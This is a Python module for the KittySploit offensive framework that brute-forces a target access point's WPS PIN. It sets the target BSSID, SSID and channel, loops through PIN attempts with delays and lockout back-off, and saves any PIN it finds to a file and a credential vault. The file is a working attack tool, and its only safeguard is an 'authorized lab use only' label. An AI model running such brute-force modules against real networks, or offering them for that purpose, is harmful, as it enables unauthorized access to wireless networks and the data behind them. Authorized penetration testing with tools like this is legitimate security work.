#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Online WPS PIN brute-force (EAP-WSC M2 per attempt, authorized lab use only)."""

from __future__ import annotations
import os
import time
from kittysploit import *
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi WPS PIN Brute",
        "description": (
            "Iterate valid 8-digit WPS PINs against a target AP (checksum-aware). "
            "Saves resume state; backs off on WPS lockout."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "wps", "bruteforce", "802.11"],
        "references": ["https://attack.mitre.org/techniques/T1110/001/"],
        "attack": {
            "tactics": ["TA0006"],
            "techniques": ["T1110.001"],
            "prerequisites": [
                "WPS-enabled AP you own or have written permission to test",
                "Inject-capable monitor interface",
            ],
        },
    }

    bssid = OptString("", "Target AP BSSID", required=True)
    ssid = OptString("", "SSID (must match AP)", required=True)
    channel = OptInteger(0, "AP channel (0 = skip set)", required=False)
    sta_mac = OptString("", "Client MAC (empty = random)", required=False)
    start_pin = OptString("00000000", "First PIN to try (8 digits)", required=False)
    max_attempts = OptInteger(50, "Max PIN tries this run (0 = unlimited)", required=False)
    delay = OptFloat(2.5, "Seconds between PIN attempts", required=False)
    dwell = OptFloat(4.0, "Sniff window per PIN", required=False)
    resume = OptString("", "Resume JSON path (auto if empty)", required=False)

    def check(self):
        if not str(self.bssid or "").strip() or not str(self.ssid or "").strip():
            print_error("BSSID and SSID required")
            return False
        return self.wlan_check_iface()

    def run(self):
        bssid = str(self.bssid).strip().lower()
        ssid = str(self.ssid).strip()
        sta = str(self.sta_mac or "").strip() or self.wlan_pmkid_sta_mac()
        start = str(self.start_pin or "00000000").strip()
        attempts = max(0, int(self.max_attempts or 0))
        delay = float(self.delay or 2.5)
        dwell = float(self.dwell or 4.0)
        resume_path = str(self.resume or "").strip()
        if not resume_path:
            resume_path = os.path.abspath(f"wps_pin_{bssid.replace(':', '')}.json")

        if int(self.channel or 0):
            self.wlan_set_channel(int(self.channel))

        print_warning("WPS PIN brute triggers AP lockouts — authorized targets only")
        print_info(f"Target {ssid} ({bssid}) | resume {resume_path}")

        def on_attempt(pin: str, n: int, result: str) -> None:
            if result == "found":
                print_success(f"PIN accepted: {pin} (attempt {n})")
            elif result == "locked":
                print_error(f"WPS lockout or no M1 after attempt {n} ({pin})")
            else:
                print_status(f"[{n}] {pin} → {result}")

        t0 = time.time()
        state = self.wlan_wsc_brute_pin(
            bssid,
            ssid,
            sta,
            start_pin=start,
            max_attempts=attempts,
            delay=delay,
            dwell=dwell,
            resume_path=resume_path,
            on_attempt=on_attempt,
        )
        elapsed = time.time() - t0

        if state.found_pin:
            out = os.path.abspath(f"wps_pin_found_{bssid.replace(':', '')}.txt")
            with open(out, "w", encoding="utf-8") as handle:
                handle.write(f"BSSID={bssid}\nSSID={ssid}\nPIN={state.found_pin}\n")
            self.wlan_vault_store(
                ssid=ssid,
                bssid=bssid,
                secret_type="wps_pin",
                secret=state.found_pin,
                nickname=f"{ssid}-wps",
            )
            print_success(f"Found PIN {state.found_pin} in {elapsed:.1f}s → {out}")
            return True

        print_warning(
            f"No PIN ({state.attempts} tries, last={state.last_pin}) — see {resume_path}"
        )
        return False